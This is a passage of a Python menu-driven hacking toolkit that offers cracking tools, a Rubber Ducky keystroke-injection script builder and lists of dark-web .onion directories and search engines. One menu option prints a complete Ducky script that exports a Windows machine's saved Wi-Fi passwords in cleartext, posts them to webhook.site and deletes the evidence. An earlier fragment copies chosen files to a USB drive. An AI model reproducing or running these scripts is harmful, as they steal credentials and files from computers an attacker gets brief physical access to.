                    DEFINE #SINGLE_PATH C:\Users\Aleff\Downloads\photo.png
                i.e. in PowerShell before extension
                    $fileToSavePath = "C:\Users\Aleff\Downloads\photo.png"

            Set #FLAG_SINGLE_FILE FALSE if you want to send multiple files.
            In this case in the PowerShell you will have to create the variable $fileToSavePaths, which is an array of strings that should contain the list of paths related to the files you want to save.
                i.e. in PowerShell before extension:
                    $fileToSavePaths = @(
                        "C:\Users\Aleff\Downloads\photo.png",
                        "C:\Users\Aleff\Downloads\document.pdf",
                        "C:\Users\Aleff\Downloads\song.mp3"
                    )
                Some tips:
                    How to create an Array?
                        > $fileToSavePaths = @()
                    How to add an element?
                        > $fileToSavePaths += "C:\Users\Aleff\Downloads\photo.png"
                    How to see the array?
                        > $fileToSavePaths
    END_REM
    REM Settings
    DEFINE #DRIVER_LABEL DUCK
    DEFINE #FLAG_SINGLE_FILE FALSE
    DEFINE #SINGLE_PATH 0

    REM Extension Code
    FUNCTION SAVE_SINGLE_FILE()
        IF ( #SINGLE_PATH != 0 ) THEN
            STRINGLN mv #SINGLE_PATH >> ${m}:\
        ELSE IF ( #SINGLE_PATH == 0 ) THEN
            STRINGLN mv ${fileToSavePath} >> ${m}:\
        END_IF
    END_FUNCTION

    FUNCTION SAVE_MULTIPLE_FILES()
        STRINGLN
            foreach ($fileToSavePath in $fileToSavePaths) {
                mv ${fileToSavePath} >> ${m}:\
            }
        END_STRINGLN
    END_FUNCTION

    STRINGLN $m=(Get-Volume -FileSystemLabel '#DRIVER_LABEL').DriveLetter;
    IF_DEFINED_TRUE #FLAG_SINGLE_FILE
        SAVE_SINGLE_FILE()
    END_IF_DEFINED
    IF_NOT_DEFINED_TRUE #FLAG_SINGLE_FILE
        SAVE_MULTIPLE_FILES()
    END_IF_DEFINED
END_EXTENSION  
              
              ''')
        Build_A_Ducky()


    elif option == "10)":
        print('''
REM Ducky Script for Steal Saved WiFi Password
REM Author - TechChip
REM https://github.com/techchipnet
REM https://youtube.com/techchipnet
DELAY 500
GUI r
DELAY 1000
STRING cmd /k mode con: cols=25 lines=1
DELAY 100
ENTER
DELAY 1000
STRING cd %temp%
ENTER
DELAY 500
STRING netsh wlan export profile key=clear
ENTER
DELAY 500
STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
ENTER
DELAY 1000
DELAY 500
REM next command will post wifi password on webhook.site
REM watch demo on techchip youtube channel
STRING powershell Invoke-WebRequest -Uri https://webhook.site/<paste webhook unique id here> -Method POST -InFile WiFi-Key
ENTER
STRING del Wi* /s/f/q
ENTER
DELAY 500
STRING exit
ENTER             
            ''')
        Build_A_Ducky()

    elif option == "BACK":
        clear_screen()
        Hell()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        cracking_and_breaking() 

#########------------------------------------------Pre Built Ducky Scripts-------------------------------------------------#######

def Pre_Ducky_Scripts():

    change()

    print("This site is still under construction")

    foot()

    option = input ("< ")


    if option == "BACK":
        clear_screen()
        Rubber_Ducky_Main()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Build_A_Ducky() 

##########--------------------------------------Rubber Ducky Script Builder------------------------------------------------#####
def Rubber_Ducky_Main():

    change()

    print('''
  _      _      _
>(.)__ <(.)__ =(.)__
 (___/  (___/  (___/
 ____             _          
|  _ \ _   _  ___| | ___   _ 
| | | | | | |/ __| |/ / | | |
| |_| | |_| | (__|   <| |_| |
|____/ \__,_|\___|_|\_\\__, |
                       |___/           
          ''')

    print('''
    Welcome to the Rubber Ducky Home Screen.
    Do you wish to build your own script or use a pre-built script?
    ''')
    print(" ")
    print("-------------------------------------------------------------------")
    print(" ")
    print("1) Pre-Built Ducky Scripts")
    print("2) Build Your Own Script")
    print("3) Ducky to Python")

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        Pre_Ducky_Scripts()

    elif option == "2":
        clear_screen()
        Build_A_Ducky()

    elif option == "3":
        clear_screen()
        Ducky2python()    
    
    elif option == "BACK":
        clear_screen()
        Hell()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        cracking_and_breaking() 

##### -------------------------------------------Cracking and Breaking ---------------------------------------------#####
def cracking_and_breaking():
    
    change()

    print("What Are We Cracking Into Today?")
    print("1) Passwords")
    print("2) Accounts")
    print("3) WiFi")
    print("4) Rubber Ducky Script Builder")

    foot()

    option = input("> ")

    if option == "1":
        clear_screen()
        passwords()

    elif option == "2":
        clear_screen()
        accounts()

    elif option == "3":
        clear_screen()
        WiFi()

    elif option == "4":
        clear_screen()
        Rubber_Ducky_Main()

    elif option == "BACK":
        clear_screen()
        Hell()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        cracking_and_breaking() 



######## ------------------------------------ HELL BRANCH ----------------------------------------------------------########
def Hell():
    change()
    clear_screen()
    ascii_devil()
    ascii_hell_sign()
    
    print(colored('Welcome To Hell, Pick Your Posion' , 'red' , attrs=[ 'blink' , 'bold']))
    print("1) Monitoring and Recon")
    print("2) Probing and Testing")
    print("3) Cracking and Breaking")
   
    foot()
   
    option = input("> ")

    if option == "1":
        clear_screen()
        ascii_monitoring_recon_graphic()
        ascii_monitoring_recon_sign()
        Monitoring_and_Recon()

    elif option == "2":
        clear_screen()
        ascii_probing_graphic()
        ascii_probing_sign()
        Probing()

    elif option == "3":
        clear_screen()
        ascii_cracking_breaking()
        cracking_and_breaking()

    elif option == "BACK":
        clear_screen()
        main_menu()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Hell() 

#########----------------------------------------------------Deep Search--------------------------------------------------##########

def Deep_Search():

    change()
    print("Deep search is a Dark Web crawler that will scrape URL's related to what you look for")
    print("-----------------------------------------------------------------------------------------")
    print(" ")
    print("1) Install")
    print("2) Run")

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        os.system("git clone https://github.com/Thr0wAway-n0w/Deep.git")
        Deep_Search()
    
    elif option == "2":
        clear_screen()
        os.chdir("Deep")
        os.system("python3 Dark.py")



##########-----------------------------------------------------Dark Web Crawlers------------------------------------------########

def Dark_Web_Crawlers():

    ascii_dark_web_crawler()

    print('''
These are dark web crawlers. Type what you want to search for
and let them do all the work of compiling URLs.
            ''')
    print("---------------------------------------------------------------------")
    print(" ")
    print("1) Deep Search")

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        Deep_Search()


##########-------------------------------------------------Dark Web Search Engines---------------------------------------########

def search_engines():

    print('''
          
          Dark Web Search Engines.
          
          Copy the link and paste it into the Tor Browser.
          ''')

    print("Torch - http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion/")
    print("Excavator - http://2fd6cemt4gmccflhm6imvdfvli3nf7zn6rfrwpsy7uhxrgbypvwf5fad.onion/")
    print("Deep Search - http://search7tdrcvri22rieiwgi5g46qnwsesvnubqav2xakhezv4hjzkkad.onion/")
    print("Tor66 - http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion/")
    print("Tordex - http://tordexu73joywapk2txdr54jed4imqledpcvcuf75qsas2gwdgksvnyd.onion/")
    print("Tor Search Engine - http://searchesqafmar2ocusr443hnolhmrxek5xu3hrw3wliwlzmdywvjtqd.onion/index.php")
    print("Submarine - http://no6m4wzdexe3auiupv2zwif7rm6qwxcyhslkcnzisxgeiw6pvjsgafad.onion/index.php")
    print("OnionLand Search - http://3bbad7fauom4d6sgppalyqddsqbf5u5p56b5k5uk2zxsy3d6ey2jobad.onion/")
    print("Hoodle - http://nr2dvqdot7yw6b5poyjb7tzot7fjrrweb2fhugvytbbio7ijkrvicuid.onion/")
    print("Amnesia - http://amnesia7u5odx5xbwtpnqk3edybgud5bmiagu75bnqx2crntw5kry7ad.onion/")
    print("OnionLand - http://3bbad7fauom4d6sgppalyqddsqbf5u5p56b5k5uk2zxsy3d6ey2jobad.onion/")
    print("Venus - http://venusoseaqnafjvzfmrcpcq6g47rhd7sa6nmzvaa4bj5rp6nm5jl7gad.onion/")
    print("Onion Center - http://5qqrlc7hw3tsgokkqifb33p3mrlpnleka2bjg7n46vih2synghb6ycid.onion/javaoff")
    print("Light - http://light32oppwtsuqbdzysloalbsqksjfoau237z7qzbujcbbklgfa25id.onion/")
    print("---------------------------------------------------------------------------------------------------------")
    
    print(colored('Which Path Do you Choose?' , 'red' , attrs=['reverse' , 'blink' , 'bold']))
    print("1) Go to Heaven")
    print("2) Go to Hell")
    print("3) Go to Purgatory")
    
    foot()
    
    option = input("> ")

    if option == "1":
        clear_screen()
        Heaven()

    elif option == "2":
        clear_screen()
        Hell()

    elif option == "3":
        clear_screen()
        Purgatory()

    elif option == "BACK":
        clear_screen()
        Dark_Websites()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        search_engines() 


#######--------------------------------------------------------------Dark Web Chatrooms and Forums--------------------------------------########

def chatrooms_forums():

    print("This page is still under construction")
    
    foot()
    
    option = input("> ")

    if option == "BACK":
        clear_screen()
        Dark_Websites()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        chatrooms_forums() 


    

########-------------------------------------------------------Dark Web Directories -------------------------------------########

def directories():

    print('''
          Dark Web Directories
          
          Copy the link and paste it into the Tor Browser.
          ''')

    print("MEGALINKS - http://megaligvlxvyg2qakftplhghbzxatfgawpta5cvafoxfcoxlthofxzid.onion/")
    print("Fresh Onions - http://freshqfv3bjsc4bz7ajhbvchdtwijyyz5kvlbibokjieazjeyknhhdid.onion/")
    print("Nexus - http://nexus3xpq52kd7fnobiwwndytystymajamfwoawhppn2wqgqetoucoyd.onion/")
    print("Dark Listing - http://darkobds5j7xpsncsexzwhzaotyc4sshuiby3wtxslq5jy2mhrulnzad.onion/")
    print("V3 Paste - http://v3pastedc5jeqahtq77gvu3vz222bcqhlfubfunzjzqedg6jdqqlvgqd.onion/index.php")
    print("OnionServices - http://onionserh5njpt6tdnvjj3ttfz7ffo6g5la54d5njl5wkqygkh3wxxyd.onion/")
    print("Wiki Pages - http://uquroyobsaquslaunwkz6bmc3wutpzvwe7mv62xeq64645a57bugnsyd.onion/")

    foot()

    option = input("> ")

    if option == "BACK":
        clear_screen()
        Dark_Websites()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        directories() 


#######--------------------------------------------------Dark Websites----------------------------------------------########

def Dark_Websites():

    print(colored('These sites are for the Tor network only, use at your own risk' , 'red' , attrs=['reverse' , 'blink' , 'bold']))
    print("1) Search Engines")
    print("2) Chatrooms / Forums")
    print("3) Directories")
    print("4) Dark Web Crawlers")

    foot()
    
    option = input("> ")

    if option == "1":
        clear_screen()
        search_engines()

    elif option == "2":
        clear_screen()
        chatrooms_forums()

    elif option == "3":
        clear_screen()
        directories()

    elif option == "4":
        clear_screen()
        Dark_Web_Crawlers()

    elif option == "BACK":
        clear_screen()
        Purgatory()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Dark_Websites() 


    
######---------------------------------------------- Clear Websites-----------------------------------######

def Clear_Websites():


    print("This page is still under construction")

    foot()

    option = ("> ")

    if option == "BACK":
        clear_screen()
        Purgatory()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Clear_Websites() 



#########------------------------------------------Reading Material---------------------------------------########

def Reading_Material():


    print("This page is still under construction")

    foot()

    option = ("> ")

    if option == "BACK":
        clear_screen()
        Purgatory()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Reading_Material() 



#######---------------------------------------------- Clearnet Forums ---------------------------------------------#######
def Forums():

    print("This page is still under construction")
    
    foot()
    
    option = ("> ")

    if option == "BACK":
        clear_screen()
        Purgatory()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Forums() 




####### ---------------------------------------- PURGATORY ---------------------------------------------------------########
def Purgatory():
    change()
    clear_screen()
    ascii_purgatory()
    ascii_purgatory_sign()

    print(colored('Welcome To Purgatory, Where Do You Wander?' , 'red'))
    print("1) Dark Websites")
    print("2) Clear Websites")
    print("3) Reading Material")
    print("4) Forums")
    
    foot()
    
    option = input("< ")



    if option == "1":
        clear_screen()
        Dark_Websites()

    elif option == "2":
        clear_screen()
        Clear_Websites()

    elif option == "3":
        clear_screen()
        Reading_Material()

    elif option == "4":
        clear_screen()
        Forums()

    elif option == "BACK":
        clear_screen()
        main_menu()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Purgatory() 



######## ------------------------------------ MAIN MENU ------------------------------------------------------------ ############
def main_menu():
    change()
    clear_screen()
    ascii_Afterlife()
    ascii_welcome()

    print('''
        @------------------------------------------------------@
        @--------------- Created By John Redpath --------------@
        @------------------------------------------------------@

          ''')


    print("For Best Use, Put Afterlife In Own Folder")
    
    print(colored('Which Path Do you Choose?' , 'red' , attrs=['reverse' , 'blink' , 'bold']))
    print(colored('Please pick a number between 1-3' , 'red'))
    print("1) Heaven")
    print("2) Hell")
    print("3) Purgatory")
    print(colored('4) Return To the Living' , 'red'))
    option = input("> ")

    if option == "1":
        clear_screen()
        Heaven()
        
    elif option == "2":
        clear_screen()      
        Hell()
        
    elif option =="3":
        clear_screen()
        ascii_purgatory()
        ascii_purgatory_sign()
        Purgatory()
    elif option =="4":
        clear_screen()
        exit()
    else:
        print("\033[91m Sorry You Must Choose a Proper Afterlife\033[0m")
        time.sleep(1)
        clear_screen()
        main_menu() 

if __name__ == "__main__":
    main_menu()
